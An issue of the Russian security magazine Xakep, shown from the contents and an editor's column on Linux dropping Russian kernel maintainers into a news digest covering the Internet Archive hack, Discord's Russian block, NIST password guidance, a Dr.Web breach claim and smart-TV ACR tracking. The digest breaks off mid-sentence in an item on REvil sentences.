
            № 307
CONTENTS


    Финский гнев
  Колонка главреда

    MEGANews
  Самые важные события в мире инфосека за октябрь

    Врешь, не уйдешь
  Как работает угон пользовательских сессий в Windows

     Угон COM
  Как работает кража сессии через механизм COM

    Вечеринка у бассейна
  Применяем технику PoolParty для инъекции в процессы

    Базовые атаки на AD
  Разбираем Kerberoasting, AS-REP Roasting и LLMNR Poisoning

    Потрошилка API
  Используем Nuclei и кастомные шаблоны для фаззинга OpenAPI

    Управление гневом
  Изучаем Angr — фреймворк символической эмуляции

    HTB Editorial
  Используем SSRF и баг в GitPython, чтобы захватить сервер

    HTB Mist
  Используем технику ESC13 для захвата домена Active Directory

    HTB Blurry
  Атакуем сервер через уязвимость в ClearML

    HTB Freelancer
  Атакуем Microsoft SQL Server и анализируем дамп памяти

    Тайная переписка
  Выбираем почтовый сервис с наилучшей защитой

    Пароль «рыба-меч»
  Выбираем облачный менеджер паролей

    Борьба со сливами
  Дмитрий Борощук о профилактике утечек данных

    Полуось
  Как OS/2 изменила судьбу Microsoft и открыла дорогу для Windows

    НЕ ТЕ окна
  Вспоминаем историю Windows NT

    Карта мира генеративного ИИ
  Выбираем модель и интерфейс, разбираемся с терминами
HEADER





Из  списка  официальных  мейнтейнеров
ядра Linux исключили одиннадцать россий‐
ских разработчиков. Эта новость задела
многих — причем не  только в  России.
Давай попробуем разобраться, что именно       Андрей Письменный                                                                                      Главный редактор
случилось, почему и какие из этого можно         apismenny@gmail.com
сделать выводы.


Началось все с патча от 18 октября 2024 года, в котором Грег Кроа‑Хартман,
ответственный  за  выпуск  стабильной  ветки  ядра,  убрал  из  файла
MAINTAINERS одиннадцать русских фамилий. Это не осталось незамеченным,
и вскоре начал разгораться скандал.
   Керосина в огонь подлил Линус Торвальдс, написав следующее:

       Совершенно понятно, почему эти изменения были сделаны, и отме-
      нять их никто не будет. Попытка троллей с российских фабрик исполь-«
      зовать анонимные аккаунты, чтобы изобразить активистов, ни к чему
      не приведет.
           Кстати, если кто действительно интересуется, а не просто тролль
      на зарплате, «различные официальные требования» исходят не только
      от США.
       И если  кто‑то еще не  слышал про  санкции  против  России,
       почитайте, что ли, новости. И под «новостями» я имею в виду не про-
       российский спам.
         Тем, кто шлет мне патчи с откатом изменений, — попробуйте вклю-
      чить пюрешку, которая у вас называется мозгами. Я — финн. Что,
       думаете, я стану поддерживать российскую агрессию? Похоже, у вас
      там не только нормальных новостей не хватает, но и знаний истории.                »
Как после этого могло не полыхнуть? Но нас, как всегда, интересуют не эмо‐
ции, а настоящие мотивы.
   Сразу отметим важный момент: коммитить код российским разработчикам
никто не запрещал. Их имена и почты лишь убрали с глаз долой — из списка
официальных представителей.
   Однако все равно остается тяжкое ощущение, что это противоречит
какой‑то неписаной этике свободного софта. Опенсорс всегда создавался
людьми из самых разных частей планеты, независимо от того, как эти части
относятся друг к другу. А тут вдруг добровольный труд нескольких разработ‐
чиков отвергают вроде бы за одну только национальность.
   Тем, кто мало знаком с миром опенсорса, важно объяснить второй клю‐
чевой момент. Слова «добровольный труд» вовсе не обязательно значат, что
разработчик пилит ядро Linux у себя дома и питается чем бог пошлет. Боль‐
шинство мейнтейнеров, включая самого Торвальдса, вполне официально
получают вознаграждение.
   Чаще всего линуксоиды‑ядерщики работают в какой‑нибудь компании,
которая сама нуждается в низкоуровневом коде для Linux и потому держит
на  зарплате  соответствующих  девелоперов. Они  трудятся  в основном
на свою контору, но заодно что‑то коммитят в апстрим — то есть отправляют
патчи на ревью Торвальдсу и его помощникам, а те решают, включать или не
включать новый код в ядро.
   Крупные компании вроде Red Hat, Intel или IBM еще и донатят специаль‐
ным НКО (например, Linux Foundation, где работает Линус), а те раздают
гранты авторам важных компонентов, не получающим за свой вклад обычную
зарплату.
  А где крупные компании или спонсируемые ими фонды, там и противное
свободолюбивому духу словечко «комплаенс», то есть требования, которым
нужно соответствовать. Например, соблюдать санкции, если их ввело пра‐
вительство страны, в которой работает компания или фонд.
   Как   минимум   часть   российских   программистов,   исключенных
из MAINTAINERS, трудоустроены в подсанкционных фирмах: «Сбере», «Бай‐
кал электроникс» и «Открытой мобильной платформе», принадлежащей «Рос‐
телекому». Сотрудничество с ними, пусть и опосредованное, юристы Red Hat
и IBM наверняка видят как потенциальную проблему. Да и самому Linux
Foundation за несоблюдение санкций может прилететь от федерального пра‐
вительства.
   Так что перед Торвальдсом, скорее всего, встал выбор между один‐
надцатью разработчиками (из более чем тысячи) и крупными донорами.
Потеря чего из этого навредит развитию Linux больше? Ответ очевиден.
   Интересно, что напрямую об этом сказано не было (несмотря на просьбы
выражаться яснее):  Торвальдс лишь сослался на нежелание обсуждать
с широкой публикой «юридические детали». Но намеки совсем не тонкие.
   Тут кто‑то обязательно скажет, что принятие политических сторон нав‐
редит общему делу еще больше и лучше бы потерять деньги спонсоров,
но не нарушить принципы. Но для тех, кто хорошо знаком с творчеством Тор‐
вальдса, его нежелание вопреки всему стоять горой за идеалы свободного
софта вряд ли будет шоком.
   Торвальдс никогда не стремился выражаться и действовать нейтрально.
Есть целые коллекции примеров  того, как «отец  Linux» кому‑то  грубит
или откровенно посылает. Он неоднократно ссорился с другими разработ‐
чиками и был центром самых разных скандалов.





                   Торвальдс передает привет фирме Nvidia

А вот каким‑то мощным идеологом свободного софта Торвальдс никогда
не был. Лицензировать ядро Linux по GPL его изначально уговорил Ричард
Столлман, и Торвальдс, в отличие от него, практикует куда более утилитарный
подход к опенсорсу.
  Для Столлмана и его соратников из FSF свобода софта — это цель, а ядро
Linux — просто компонент, без которого система GNU/Linux не смогла бы
работать. Для Торвальдса же все наоборот: разработка Linux — цель, а сво‐
бодная лицензия — средство ее достижения.
   Отсюда и частые разногласия. Например, Торвальдс не раз критиковал
GPL v3 — новую версию лицензии, которая обязывает разработчиков железа
раскрывать код прошивки, если в ней использован опенсорсный код. По мне‐
нию  Торвальдса, такой радикализм лишь уменьшит популярность  Linux,
а потому не нужен.
   Ну и наконец, если кто‑то считал, что разработка свободного софта —
это какой‑то отдельный мир без политики, то зря. Просто политическими
в нем обычно считаются совсем другие темы: например, какой протокол
или стандарт выбрать. Ответы на такие вопросы — вещь вовсе не абстрак‐
тная, и они могут напрямую помочь или навредить какой‑нибудь крупной ком‐
пании, а значит, на кону нередко большие деньги.
   Какие выводы можно сделать из этой истории? Первый и самый очевид‐
ный связан с личностью Линуса Торвальдса. Судить о его манере руководс‐
тва, стиле публичного общения и взглядах на опенсорс я, пожалуй, оставляю
читателю. Посоветую только не приписывать человеку приверженность опре‐
деленным (или, самое веселое, — не вполне определенным) идеалам,
а затем гневаться, что он им не соответствует.
  Для меня куда важнее второй, глобальный вывод. Чем более серьезную
роль в нашей жизни играет софт, тем сложнее будет его разработке оста‐
ваться в стороне от мирских дел. История с ядром Linux и русскими мейнтей‐
нерами — яркий тому пример. И совершенно точно не последний.
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru


В этом месяце: «Архив интернета» подвергся сразу несколь‐
ким атакам, в России заблокировали Discord, нескольким
участникам  группировки  REvil  вынесли  приговоры, NIST
предложил  пересмотреть   требования   к   составлению
паролей, телевизоры следят за тем, что смотрят пользовате‐
ли,  а  также  другие  интересные  события  прошедшего
октября.





ВЗЛОМ «АРХИВА
ИНТЕРНЕТА»
В октябре некоммерческую организацию «Архив интернета» (Internet Archive)
взломали дважды, а также злоумышленники похитили аутентификационную
БД пользователей, содержащую более 31 миллиона уникальных записей.
  О первой атаке стало известно 9 октября 2024 года, и ее заметили
посетители сайта Wayback Machine (archive.org), так как хакеры создали
JavaScript-оповещение, в котором прямо заявили, что Internet Archive ском‐
прометирован.





     «Вам никогда не казалось, что Internet Archive работает на честном
       слове и постоянно находится на грани катастрофического нарушения«
      безопасности? Именно это только что произошло. Увидимся с 31 мил-
      лионом из вас на HIBP», — гласило сообщение злоумышленников.                »
Под аббревиатурой HIBP подразумевался сервис Have I Been Pwned, собира‐
ющий информацию об утечках данных. Здесь пользователи могут проверить
свою информацию на предмет компрометации, а также подписаться на соот‐
ветствующие уведомления. Ресурс был создан ИБ‑специалистом Троем Хан‐
том (Troy Hunt), и хакеры нередко делятся с ним украденными данными
для добавления в базу HIBP.
   Трой Хант сообщил, что за девять дней до дефейса сайта злоумышленник
действительно поделился с ним аутентификационной базой данных Internet
Archive,  которая   представляет  собой  SQL-файл   (ia_users.sql)   раз‐
мером 6,4 Гбайт.
   Эта БД содержала информацию об аутентификации зарегистрированных
пользователей, включая их адреса электронной почты, псевдонимы, времен‐
ные метки смены паролей, хешированные bcrypt пароли и другую внутреннюю
информацию. Самая  последняя  метка  в  записях  датирована 28  сен‐
тября 2024 года. Предполагается, что именно тогда и была украдена БД.
  По словам Ханта, суммарно база содержит 31 миллион уникальных email-
адресов и многие из этих людей подписаны на уведомления об утечках дан‐
ных на HIBP. Исследователь связался с некоторыми людьми, чья информация
фигурировала в утечке, и те подтвердили подлинность данных.
  В итоге дамп был добавлен в БД HIBP, и все пользователи могут про‐
верить, действительно ли их данные были раскрыты в результате компро‐
метации Internet Archive, а тем, кто подписан на уведомления об утечках, уже
разосланы предупреждения.
   Интересно, что одновременно со взломом «Архив интернета» подвергся
и мощным DDoS-атакам, ответственность за которые взяла на себя про‐
палестинская хакгруппа SN_BlackMeta. Хотя DDoS и взлом Internet Archive
происходили практически одновременно, за этими инцидентами стояли раз‐
ные злоумышленники. То есть дефейс и кража данных никак не связаны
с SN_BlackMeta.
  19–20 октября 2024 года Internet Archive пострадал от второй атаки: в эти
дни множеству пользователей неожиданно пришли ответы на старые запросы
по удалению контента из Wayback Machine. Сообщения были написаны зло‐
умышленниками и гласили, что организация взломана, поскольку небрежно
обращалась со  своими  аутентификационными  токенами, которые были
похищены еще во время первой атаки.

      «Удручающее зрелище. Даже после того, как несколько недель назад
       стало известно о взломе, IA так и не проявила должной осмотритель-«
       ности и не обновила многие ключи API, которые были раскрыты в сек-
      ретах на их GitLab, — гласило письмо. — Как показывает это сооб-
      щение, среди них был токен Zendesk с правами доступа к 800K+
      тикетов поддержки, отправленных на info@archive.org с 2018 года.
       Неважно, пытались ли вы задать какой‑то вопрос или попросили уда-
      лить ваш сайт из Wayback Machine, теперь ваши данные находятся
      в руках какого‑то  рандомного  парня. Если бы это не  сделал  я,
      это сделал бы кто‑то другой».                »





При этом некоторые пользователи отмечали, что при запросе на удаление
контента из Wayback Machine им приходилось указывать личные данные. То
есть эта информация тоже может находиться в руках злоумышленников,
в зависимости от того, какой доступ они имели к Zendesk.
   Журналисты  издания  Bleeping  Computer  писали,  что  неоднократно
пытались  предупредить  администрацию  Internet  Archive о  том,  что  их
исходный код украден через аутентификационный токен GitLab, который «све‐
тился» в сети на протяжении двух лет. Однако издание так и не получило отве‐
та от представителей организации.
   Дело в том, что человек, взломавший «Архив интернета» в середине
октября, сильно расстроился, когда многие СМИ по ошибке приписали взлом
упомянутой выше  группировке  SN_BlackMeta. В  итоге  хакер  связался
с Bleeping Computer через посредника, взял на себя ответственность за атаку
и объяснил, как проник в Internet Archive.
  По словам злоумышленника, атака началась с того, что он нашел дос‐
тупный файл  конфигурации GitLab на одном из серверов  организации
(services-hls.dev.archive.org). Изданию удалось подтвердить, что этот токен
действительно был доступен посторонним как минимум с декабря 2022 года,
причем за это время он неоднократно менялся.





Хакер утверждает, что файл конфигурации содержал аутентификационный
токен, позволяющий загрузить исходный код  Internet Archive. Якобы эти
исходники включали дополнительные учетные данные и аутентификационные
токены, в том числе от системы управления БД Internet Archive. В итоге зло‐
умышленник скачал БД пользователей, исходные коды и дефейснул сайт.
   Согласно заявлениям хакера, в общей сложности он похитил у «Архива
интернета» 7 Гбайт данных, однако он отказался предоставить журналистам
какие‑либо образцы в качестве доказательства своих слов. Пока очевидно
лишь то, что токены доступа к API Zendesk определенно были среди похищен‐
ной информации.
   Как отметил владелец и главный редактор Bleeping Computer Лоренс
Абрамс (Lawrence Abrams), после компрометации «Архива интернета» в сети
появилось множество теорий о том, кто мог взломать НКО и зачем это вооб‐
ще могло кому‑то понадобиться. Так, некоторые полагают, что за атакой сто‐
ит Израиль, другие обвиняют правительство США, а третьи подозревают, что
на такой шаг могли пойти крупные корпорации, которые давно борются с НКО
из‑за нарушений авторских прав.
   Однако Абрамс пишет, что мотивы злоумышленников не были политичес‐
кими или финансовыми. По его словам, ресурс взломали просто так, потому
что могли. Якобы эта атака помогла повысить репутацию хакера среди других
преступников.


2 УНДЕЦИЛЛИОНА РУБЛЕЙ ТРЕБУЮТ РОССИЙСКИЕ
ТЕЛЕКАНАЛЫ ОТ GOOGLE
По данным СМИ, общая сумма требований 17 российских телеканалов к компании Google дос‐
тигла 2 ундециллионов рублей. Ундециллион — это единица с 36 нулями.

Суд назначил штраф Google из‑за того, что компания не выполнила требование по восстанов‐
лению аккаунтов на YouTube ряда российских медиа. Пострадавшими по этому делу проходят,
например, «Звезда», «Первый канал» и ВГТРК.


Суд обязал Google восстановить их аккаунты на YouTube, а в случае неисполнения требова‐
ний — взыскать неустойку. Если решение суда не будет выполнено в течение девяти месяцев
с момента его вступления в силу, за каждый день неисполнения начисляется штраф в размере
100 000 рублей. Также сумма удваивается каждую неделю, пока решение не будет выпол‐
нено, а ограничения общей суммы штрафа попросту нет.





БЛОКИРОВКА
DISCORD
8 октября 2024 года мессенджер Discord был заблокирован в России
за нарушение требований законодательства РФ. Ранее Роскомнадзор (РКН)
направил администрации Discord требование удалить 947 противоправных
материалов.


       «Доступ к мессенджеру Discord ограничен в связи с нарушением тре-
       бований  российского законодательства, выполнение которых необ-«
      ходимо для предотвращения использования мессенджера в террорис-
       тических и экстремистских целях, вербовки граждан для их совер-
      шения, продажи наркотиков, в связи с размещением противоправной
      информации», — заявили в РКН.                »
В ведомстве отметили, что направили в адрес Discord множество требований
удалить запрещенный контент, однако ряд таких материалов был по‑преж‐
нему доступен в свободном доступе.
  К примеру, за неделю до блокировки сообщалось, что РКН направил
администрации Discord требование удалить «947 противоправных матери‐
алов, в том числе содержащих детскую порнографию, призывы к экстремиз‐
му, вовлечение несовершеннолетних в совершение противоправных дей‐
ствий, призывы к самоубийству, пропаганду ЛГБТ (признано экстремистским
и запрещено в РФ) и пронаркотический контент». По данным РКН, некоторые
из этих «интернет‑страниц» не были удалены.
   Также в прошлом в Роскомнадзоре уже заявляли, что Discord не выполняет
требования закона после включения в реестр социальных сетей, хотя после
этого компания обязана самостоятельно выявлять и блокировать противоп‐
равный контент.

       «Мессенджер Discord в основе своей — это анонимное сообщество.
       Изначально созданный для использования в онлайн‑играх, со вре-«
     менем он стал активно использоваться преступниками. Благоприятные
       условия для сокрытия преступной деятельности при расследованиях
       создает полный отказ его владельцев от подтверждения сведений
      о номере телефона пользователя при регистрации в соответствии
      с требованиями российского законодательства. Как и в даркнете, ано-
       нимность  гарантирует  преступникам  безнаказанность, —  заявляли
      в РКН. — Discord сегодня по‑прежнему распространяет запрещенную
      информацию,  способствующую  совершению  серьезных  уголовных
       преступлений, отказывается выполнять требования законодательства,
      обеспечивающие возможность выявления преступников и пресечение
      их деятельности против граждан России».                »
Как теперь сообщил член комитета Государственной думы по информацион‐
ной политике Антон Немкин, блокировка Discord — это «сигнал другим инос‐
транным ИТ‑компаниям о том, что терпение и желание вести переговоры
заканчиваются». По его словам, блокировка направлена на обеспечение
безопасности российских пользователей.





ПАВЕЛ ДУРОВ ОБ ИЗМЕНЕНИИ TERMS OF SERVICE
TELEGRAM
Глава  Telegram  прокомментировал  изменения  в  условиях  предоставления  услуг  (Terms
of Service) и политике конфиденциальности (Privacy Policy) платформы. По словам Дурова,
в большинстве стран Telegram сотрудничал с правоохранительными органами и мог раскрывать
властям IP-адреса и номера телефонов преступников с 2018 года.
    Дело в том, что обновленные версии документов гласят, что IP-адреса и номера телефонов
тех, кто нарушает правила Telegram, могут быть раскрыты соответствующим органам в ответ
на правомерные юридические запросы.

         «С 2018 года Telegram может раскрывать IP-адреса  / номера телефонов→        преступников властям в большинстве стран в соответствии с нашей политикой
        конфиденциальности.
           Всякий раз, когда мы получали правильно оформленный юридический зап‐
       рос по соответствующим каналам связи, мы проверяли его и раскрывали IP-
        адреса / номера телефонов опасных преступников.
        В Европе в третьем квартале наблюдался рост числа правомерных юри‐
        дических запросов, которые мы получили. Этот рост был вызван тем, что все
       больше органов власти ЕС стали использовать для своих запросов правильный
       канал связи, предусмотренный законом DSA в ЕС [Закон о цифровых услугах].
       Информация об этой линии связи была доступна всем, кто заходил на сайт
       Telegram или гуглил Telegram EU address for law enforcement с начала 2024 года.
           Чтобы уменьшить путаницу, мы упорядочили и унифицировали нашу полити‐
        ку  конфиденциальности для  разных  стран. Но наши основные  принципы
       не изменились. Мы всегда стремились соблюдать соответствующие местные
       законы — до тех пор, пока они не противоречат нашим ценностям свободы
      и конфиденциальности.
          Telegram был создан для защиты активистов и обычных людей от коррумпи‐
       рованных правительств и корпораций, мы не позволяем преступникам злоупот‐
       реблять нашей платформой или скрываться от правосудия», — рассказал Дуров
       в своем Telegram-канале.





ТРЕБОВАНИЯ
К ПАРОЛЯМ
Национальный институт стандартов и технологий США (The National Institute
of Standards and Technology, NIST), федеральный орган, устанавливающий
технологические стандарты для правительственных учреждений, организаций
по стандартизации и частных компаний, предложил пересмотреть некоторые
из требований к паролям. В частности, предлагается отказаться от обя‐
зательного сброса, требований или ограничений на использование опре‐
деленных символов, а также от контрольных вопросов.
   Представители NIST опубликовали второй публичный черновик проекта SP
800-63-4, последней версии  Digital  Identity  Guidelines. Помимо  прочего,
в этом документе содержатся  технические требования и рекомендации
для методов определения достоверности цифровых идентификационных дан‐
ных, используемых для аутентификации в интернете. Организации, которые
взаимодействуют с федеральным правительством США в онлайне, обязаны
соблюдать эти требования.
   Раздел, посвященный паролям, содержит большое количество правил,
противоречащих общепринятым сегодня нормам. К примеру, предлагается
не требовать от конечных пользователей периодически менять пароли.
   Дело в том, что это требование появилось несколько десятилетий назад,
когда безопасность паролей была плохо изучена и люди часто выбирали
в качестве паролей имена и простые слова, которые легко угадать. С тех пор
большинство сервисов  стали требовать использования более надежных
паролей, состоящих из случайных символов или фраз. Если пароли подоб‐
раны  правильно,  требование  периодически менять их (раз в один‑три
месяца) может привести к снижению уровня безопасности, поскольку уже
известно, что это лишь стимулирует пользователей к использованию более
слабых паролей, которые им проще придумывать и запоминать.
  Еще одно требование, которое, по мнению NIST, приносит больше вреда,
чем пользы, — это обязательное использование в пароле определенных сим‐
волов или запрет на них. Например, пароль должен содержать как минимум
одну цифру, один специальный символ, одну заглавную и одну строчную бук‐
ву. Если пароли сами по себе достаточно длинные и случайные, такие огра‐
ничения тоже не приносят никакой пользы.
  В итоге обновленные рекомендации NIST гласят, что некоторые практики
должны быть запрещены, если организация хочет соответствовать стан‐
дартам:
 • верификаторы и CSP не должны вводить правила составления паролей
   (например, требовать сочетания различных типов символов);
 • верификаторы и CSP не должны требовать от пользователей периодичес‐
   кой смены паролей.

В данном случае «верификаторы» — это бюрократическая формулировка
для обозначения организаций, которые проверяют личность владельца учет‐
ной  записи,  подтверждая  его  аутентификационные  данные. А CSP —
это доверенная структура, которая назначает или регистрирует аутентифика‐
торы для владельцев учетных записей.
   Также обновленный документ содержит ряд других рекомендаций:
 • верификаторы и CSP обязаны требовать, чтобы длина пароля составляла
   не менее 8 символов, и могут требовать, чтобы длина пароля составляла
   не менее 15 символов;
 • верификаторы и CSP должны разрешать максимальную длину пароля
   как минимум 64 символа;
 • верификаторы и CSP должны позволять использовать в паролях все печат‐
  ные символы ASCII и символ пробела;
 • верификаторы и CSP должны принимать в паролях символы Unicode,
   и каждый Unicode-символ должен учитываться как один символ при оценке
   длины пароля;
 • верификаторы и CSP не должны устанавливать иные правила составления
   паролей (например, требовать сочетания различных типов символов);
 • верификаторы и CSP не должны требовать от пользователей периодичес‐
   ки менять пароли, однако верификаторы обязаны принудительно сменять
   пароли, если есть доказательства компрометации аутентификатора;
 • верификаторы и CSP не должны разрешать пользователям хранить под‐
   сказки, доступные неаутентифицированным лицам;
 • верификаторы и CSP не должны предлагать пользователям проверки
   на основе знаний (Knowledge-based authentication, например «Как звали
   вашего первого питомца?») или контрольные вопросы при выборе пароля;
 • верификаторы обязаны проверять весь введенный пароль полностью (то
   есть не усекать его).

Новые рекомендации NIST, если их примут в окончательной версии докумен‐
та, не будут обязательными для всех, однако они могут стать убедительными
аргументами в пользу отказа от многих устаревших практик.


МАЛВАРЬ В GOOGLE PLAY STORE

Специалисты компании Zscaler подсчитали, что в период с июня 2023 года по апрель 2024 года
через официальный магазин Google Play распространялось более 200 вредоносных приложе‐
ний, которые загрузили около 8 миллионов пользователей.

Самыми распространенными угрозами оказались: инфостилеры Joker (38,2%) и Facestealer
(14,7%), различная рекламная малварь (35,9%), троянизированные приложения Harly (1,8%),
банковский троян Anatsa (1,4%).





Почти половина вредоносных приложений, обнаруженных исследователями, была опубликова‐
на в Google Play в категориях «Инструменты», «Персонализация», «Фотография»,
«Продуктивность» и «Стиль жизни».





От атак мобильной малвари больше всего пострадали пользователи из Индии и США, а за
ними следуют Канада, Южная Африка и Нидерланды.





                                     Продолжение статьи →
← Начало статьи





 АТАКА НА «ДОКТОР
 ВЕБ»
  В середине октября специалисты Data Leakage & Breach Intelligence (DLBI)
   сообщили, что хакерская группировка DumpForums заявила о компрометации
   инфраструктуры компании «Доктор Веб». При этом через официальный
   Telegram-бот компании пользователям пришли сообщения о взломе.





                Сообщение от хакеров, отправленное через Telegram-бота

  По информации DLBI, хакеры обнародовали дампы ldap.dev.drweb[.]com,
   vxcube.drweb[.]com, bugs.drweb[.]com,  antitheft.drweb[.]com, rt.drweb[.]com
  и  другие.  Исследователи  писали,  что  данные  актуальны  на 17  сен‐
  тября 2024 года.
    В своем Telegram-канале группировка сообщила, что похитила у компании
   свыше 10 Тбайт данных и скрывалась в сети компании больше месяца.

        «Нам удалось взломать и выгрузить сервер корпоративного GitLab, где
          хранились внутренние разработки и проекты, сервер корпоративной «
           почты, Confluence, Redmine, Jenkins, Mantis, RocketChat — системы,
         где велась разработка и обсуждались задачи. Все проекты по улуч-
       шению  безопасности  теперь,  кажется,  нуждаются в защите сами
        по себе. Не оставили без внимания и ресурсы по управлению ПО.
          Клиентские базы данных. Да, данные пользователей, которые доверя-
        ли Dr.Web свою безопасность, мы также выгрузили. Вишенка на тор-
         те — домен‑контроллер. После того как мы овладели им, нам оста-
         валось лишь пополнять наши накопители, выгружая все больше дан-
         ных», — писали участники DumpForums.                 »





  Бывший сотрудник «Доктор Веб», пожелавший сохранить анонимность, под‐
   твердил «Хакеру» подлинность информации на опубликованных хакерами
   скриншотах.
      Представители «Доктор Веб» выпустили официальное заявление, сог‐
  ласно которому сообщения о взломе не соответствуют действительности.

         «8 октября 2024 года в одном из Telegram-каналов было опубликовано
          заявление о взломе инфраструктуры нашей компании. «
            Целевая атака на наши ресурсы действительно была осуществлена
         в сентябре, мы сразу сообщили об этом, выпустив новость.
              Атака была своевременно пресечена, все ресурсы были отключены
         от сети и прошли тщательную проверку в соответствии с протоколами
          безопасности. Основной целью было требование выкупа от нашей
          компании, но мы не ведем никаких переговоров со злоумышленни-
         ками. На данный момент правоохранительные органы проводят рас-
          следование, в связи с чем мы не можем давать подробные коммента-
         рии, чтобы не мешать проведению следствия.
             Опубликованная в Telegram информация в основной своей части
        не  соответствует  действительности,  пользовательские данные  зат-
         ронуты не были. Какой‑либо угрозы безопасности нашим пользовате-
        лям  ни  обновления  вирусных  баз,  ни  обновления  программных
        модулей не несут.
        Мы усилили меры безопасности всех ресурсов компании и изучаем
         выложенные в телеграм‑каналах скриншоты на предмет выявления
          скомпрометированных  данных», —  писали  представители  «Доктор
         Веб».                 »
   Напомним, что в сентябре 2024 года «Доктор Веб» уже атаковали хакеры.
   Тогда представители компании заявляли, что «успешно локализовали угрозу
  и убедились, что она не затронула клиентов компании», а также подчерки‐
   вали, что никто из пользователей продуктов компании не пострадал.


  197 VPN-СЕРВИСОВ ПОПАЛИ ПОД БЛОКИРОВКУ

   На  форуме  «Спектр-2024»  глава  подконтрольного  Роскомнадзору  Центра  мониторинга
   и управления сетью связи общего пользования (ЦМУ ССОП) Сергей Хуторцев сообщил, что
   в настоящее время в России заблокировано 197 VPN-сервисов. По его словам, эти сервисы
   нарушают законодательство как средства обхода блокировок.

    Стоит отметить, что в прошлом году директор ЦМУ ССОП сообщал о блокировке в РФ 167 VPN-
   сервисов.





 ТЕЛЕВИЗОРЫ-
ШПИОНЫ
   Группа исследователей предупредила, что в умных телевизорах крупных про‐
   изводителей, включая Samsung и LG, используется похожая на Shazam тех‐
  нология  автоматического  распознавания  контента  (Automatic  Content
   Recognition, ACR), позволяющая следить за тем, что смотрит пользователь.
      Согласно  докладу  ученых  из  Университетского  колледжа  Лондона,
   Калифорнийского университета в Дейвисе и Мадридского университета име‐
  ни Карла   III, система слежения работает даже  тогда, когда телевизоры
   используются в качестве внешних дисплеев, то есть подключены через HDMI
   к другим девайсам. Таким образом, ACR может перехватывать  контент
  с игровых консолей или ноутбуков, подключенных к ТВ.





   Технология ACR предназначена для профилирования зрительской активности
   пользователей. Она периодически перехватывает контент (делает скрин‐
   шоты), отображаемый на экране устройства, а затем  сопоставляет его
  со своей библиотекой контента, чтобы определить, что именно отображается
  на экране в тот или иной момент.
      Подобные системы интегрированы непосредственно в операционные
   системы умных ТВ, а black-box-аудит сетевого трафика ACR между клиентами
  на смарт‑телевизорах и серверами выявил заметные различия в работе этой
   технологии в США и Великобритании.
     К примеру, оказалось, что в США ACR активна во время просмотра бес‐
   платного стримингового телевидения с поддержкой рекламы (FAST), в то вре‐
  мя как в Великобритании она отключена в этом случае. То есть на работу фун‐
  кции напрямую влияют законы о конфиденциальности данных разных стран.
   Также ACR не работает при просмотре Netflix или YouTube. При этом под‐
   черкивается, что статус входа пользователя в систему (залогинен человек
  или нет) никак не влиял на поведение ACR.
      Исследователи говорят, что с момента своего появления в 2011 году ACR
  была адаптирована для идентификации самых разных видов контента. Такие
   компании, как DirecTV и Viggle, интегрировали ACR в экосистему телевизоров,
  а Samsung сотрудничала с компанией, занимающейся распознаванием кон‐
   тента, чтобы интегрировать ACR в свои умные ТВ. Компания LG, еще один
   крупный игрок на рынке ТВ, внедрила ACR в свои устройства еще в 2013 году,
   благодаря партнерству с компанией Cognitive Networks.


          «Когда ACR включена на телевизорах LG, устройства связываются
         с одним доменом (eu-acrX.alphonso.tv, где X — произвольное число, «
         которое периодически меняется). Этот домен принадлежит технологи-
          ческой компании Alphonso, которая  управляет LG Ad  Solutions, —
          говорится в  отчете  специалистов. — В свою  очередь, устройства
        Samsung связываются сразу с несколькими ACR-доменами (acr-eu-
          prd.samsungcloud.tv,     acr0.samsungcloudsolution.     com,      log-
         config.samsungacr.com, log-ingestion-eu.samsungacr.com)».                 »
   ACR-слежка уже вызывала беспокойство и вопросы, связанные с конфиден‐
   циальностью. В частности, в суд на компанию Vizio подавала Федеральная
   торговая комиссия США, обвиняя компанию в продаже данных о клиентах
   третьим лицам, которые затем использовали их для показа людям пер‐
   сонализированной рекламы. Этот иск был урегулирован в далеком 2017 году:
   тогда Vizio согласилась предоставлять более четкую информацию о сборе
   данных и внедрить механизмы отказа.
      Исследователи предупредили, что, невзирая на существование механиз‐
  мов отказа в наши дни, фактически отказаться от такой слежки может быть
   весьма непросто и зачастую для этого потребуется углубленное изучение
   различных настроек в многочисленных подразделах, а универсального вык‐
   лючателя попросту не существует.

         «Кроме того, неясно, работают ли эти средства контроля конфиден-
          циальности так, как было задумано изначально», — пишут специалис- «
          ты.                 »
   Впрочем, в отчете сказано, что после отказа от отслеживания вся связанная
  с ACR сетевая активность действительно прекращается.
      Эксперты подытоживают, что в будущем планируют изучить более прод‐
  винутые MITM-методы слежения, чтобы лучше разобраться в полезных наг‐
   рузках и понять связь между ACR-отслеживанием и таргетированной рек‐
  ламой в умных телевизорах.





  ГЕНПРОКУРОР РФ РАСКРИТИКОВАЛ УРОВЕНЬ
 РАСКРЫВАЕМОСТИ КИБЕРПРЕСТУПЛЕНИЙ
   Генеральный прокурор РФ Игорь Краснов подверг критике работу правоохранительных органов
   за уровень раскрываемости киберпреступлений. Он сообщил, что «ситуация  усугубляется
   нарушениями в деятельности органов расследования и оперативных служб». По его словам,
   несмотря на наличие в ведомствах спецподразделений по противодействию киберпреступнос‐
    ти, работа должным образом не ведется, обстоятельства получения доступа к персональным
   данным и их использования в криминальных целях зачастую не устанавливаются.
       Также недостаточно развит электронный документооборот правоохранителей с организа‐
   циями финансового рынка и сотовыми операторами, что приводит к длительному получению
    оперативно значимой информации.

               «Отмечается шаблонность и безынициативность проводимой оперативной →          работы,  отсутствие  наступательности,  недостаточная  эффективность  пред‐
           варительного расследования. Во многих делах, как говорится, между двумя
           корочками больше ничего и нет. И таких дел в масштабах страны тысячи.
          Как результат, раскрываемость данного вида преступлений остается одной
          из самых низких. На протяжении последних лет она не превышает 27%, а в
         текущем году еще ниже — 25,9%», — заявил Краснов.





 ПРИГОВОРЫ
 УЧАСТНИКАМ REVIL
   Санкт‑Петербургский гарнизонный военный суд огласил приговор Артему
   Заецу, Алексею Малоземову, Даниилу Пузыревскому и Руслану Хансвярову,
  которых связывают с известной хакгруппой REvil. Против еще четырех учас‐
   тников возбуждено новое уголовное дело, которое выделено в отдельное
   производство и направлено в Генеральную прокуратуру РФ.
      Напомним,  что  активность  группировки  REvil  прекратилась  в  янва‐
  ре 2022 года, после того как ФСБ объявила об аресте 14 человек, связанных
  с группой, и провела обыски по 25 адресам в Москве, Санкт‑Петербурге,
   Ленинградской и Липецкой областях. Тогда сообщалось, что «основанием
  для разыскных мероприятий послужило обращение компетентных органов
  США».
    В итоге Тверской суд Москвы заключил под стражу восемь предполага‐
